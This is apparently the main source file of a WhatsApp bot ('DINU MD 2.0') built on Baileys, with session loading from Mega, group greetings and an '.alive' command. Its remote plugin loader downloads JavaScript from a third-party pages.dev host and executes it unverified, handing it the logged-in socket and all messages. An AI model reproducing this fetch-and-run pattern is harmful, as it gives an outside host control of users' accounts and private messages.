//══════════════════════════════════════════════════════════════════════════════════════════════════════//
//                                                                                                      //
//                                   DINU MD 2.0 BOT                                                    //
//                                                                                                      //
//                                         Ｖ：2.0                                                       //
//══════════════════════════════════════════════════════════════════════════════════════════════════════//

// Modules import
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const P = require('pino');
const util = require('util');
const axios = require('axios');
const qrcode = require('qrcode-terminal');
const express = require('express');
const path = require('path');
const https = require('https');
const { File } = require('megajs');

// Local modules
const config = require('./config');
const { ownerNumber, BOT_OWNER } = require('./config');
const { sms } = require('./lib/msg');
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { replyHandlers, commands } = require('./command');

// -------------------------------------------------------------------------------------------------- //
const app = express();
const port = process.env.PORT || 8000;
const prefix = '.';
global.pluginHooks = []; // Global variable to store plugin hooks

// -------------------------------------------------------------------------------------------------- //
// Load Mega session if not exists
async function loadMegaSession() {
    const sessionPath = path.join(__dirname, '/auth_info_baileys/creds.json');
    if (!fs.existsSync(sessionPath)) {
        if (!config.SESSION_ID) {
            console.log('❗ [Dinu-MD] SESSION_ID not found in env. Please configure it.');
            return;
        }
        const sessdata = config.SESSION_ID;
        const filer = File.fromURL('https://mega.nz/file/' + sessdata);
        try {
            const data = await new Promise((resolve, reject) => {
                filer.download((err, data) => {
                    if (err) reject(err);
                    else resolve(data);
                });
            });
            fs.writeFileSync(sessionPath, data);
            console.log('📥 [Dinu-MD] Session file downloaded and saved.');
        } catch (e) {
            console.error('❌ Failed to download Mega session:', e.message);
        }
    }
}

// -------------------------------------------------------------------------------------------------- //
// Remote plugin loader
async function loadRemotePlugins(sock) {
    console.log('🔧 [Dinu-MD] Installing plugins...');
    const pluginListURL = 'https://test30-26o.pages.dev/plugins.json';
    const pluginBaseURL = 'https://test30-26o.pages.dev/plugins/';
    const pluginsDir = path.join(__dirname, 'remote_plugins');
    if (!fs.existsSync(pluginsDir)) fs.mkdirSync(pluginsDir);

    try {
        const response = await axios.get(pluginListURL);
        const pluginFiles = response.data;
        for (const plugin of pluginFiles) {
            const pluginName = plugin.name;
            const pluginURL = pluginBaseURL + pluginName;
            const localPluginPath = path.join(pluginsDir, pluginName);
            const writer = fs.createWriteStream(localPluginPath);

            await new Promise((resolve, reject) => {
                https.get(pluginURL, res => {
                    res.pipe(writer);
                    writer.on('finish', () => writer.close(resolve));
                }).on('error', err => {
                    fs.unlink(localPluginPath, () => {});
                    reject(err);
                });
            });

            try {
                const loadedPlugin = require(localPluginPath);
                if (loadedPlugin && (loadedPlugin.onMessage || loadedPlugin.onDelete)) {
                    global.pluginHooks.push(loadedPlugin);
                }
            } catch (e) {
                console.error(`[❌ Error Loading Plugin] ${pluginName}:`, e.message);
            }
        }
        console.log('✅ [Dinu-MD] All plugins installed Successfully');
    } catch (error) {
        console.error('❌ [Dinu-MD] Failed to load plugins:', error.message);
    }
}

// -------------------------------------------------------------------------------------------------- //
// Connect to WhatsApp
async function connectToWA() {
    await loadMegaSession();
    console.log('🛰️ [Dinu-MD] Initializing WhatsApp connection...');

    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS('Firefox'),
        syncFullHistory: true,
        auth: state,
        version: version,
    });

    // Connection update
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
            connectToWA(); // Reconnect
        } else if (connection === 'open') {
            await loadRemotePlugins(sock);
            console.log('✅ [Dinu-MD] Bot started successfully.');
        }
    });

    sock.ev.on('creds.update', saveCreds);

    // Group participants update
    sock.ev.on('group-participants.update', async (update) => {
        const { id, participants, action } = update;
        const metadata = await sock.groupMetadata(id).catch(() => ({}));
        const groupName = metadata.subject || 'this group';

        for (const participant of participants) {
            const user = participant.split('@')[0];
            if (action === 'add') {
                const welcomeMsg = `🗯️ WELCOME TO ${groupName}, @${user}!`;
                await sock.sendMessage(id, {
                    text: welcomeMsg,
                    mentions: [participant]
                });
            } else if (action === 'remove') {
                const goodbyeMsg = `👋 Goodbye @${user} from ${groupName}`;
                await sock.sendMessage(id, {
                    text: goodbyeMsg,
                    mentions: [participant]
                });
            }
        }
    });

    // Messages upsert
    sock.ev.on('messages.upsert', async (messageUpdate) => {
        const message = messageUpdate.messages[0];
        if (!message.message) return;

        const from = message.key.remoteJid;
        const contentType = getContentType(message.message);
        const body = (contentType === 'conversation') ? message.message.conversation :
                     (message.message[contentType]?.text) ||
                     (message.message[contentType]?.caption) || '';

        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');

        const sender = message.key.fromMe ? sock.user.id.split(':')[0] + '@s.whatsapp.net' : (message.key.participant || from);
        const senderNumber = sender.split('@')[0];
        const isGroup = from.endsWith('@g.us');
        const botNumber = sock.user.id.split(':')[0];
        const isOwner = ownerNumber.includes(senderNumber);

        // .alive command
        if (isCmd && command === 'alive') {
            const aliveMessage = `👋 Bot is online!`;
            await sock.sendMessage(from, {
                image: { url: config.ALIVE_IMG || 'https://i.ibb.co/3s1XfHk/online.jpg' },
                caption: aliveMessage
            });
        }

        // Plugin onMessage hooks
        if (global.pluginHooks) {
            for (const hook of global.pluginHooks) {
                if (hook.onMessage) {
                    try { await hook.onMessage(sock, message); }
                    catch(e){ console.log('onMessage plugin error:', e); }
                }
            }
        }
    });
}

// -------------------------------------------------------------------------------------------------- //
// Web server
app.get('/', (req, res) => res.send('Hey, Dinu-MD started✅'));
app.listen(port, () => console.log(`🌐 [Dinu-MD] Web server running → http://localhost:${port}`));

// -------------------------------------------------------------------------------------------------- //
// Start bot
setTimeout(() => connectToWA(), 2500);
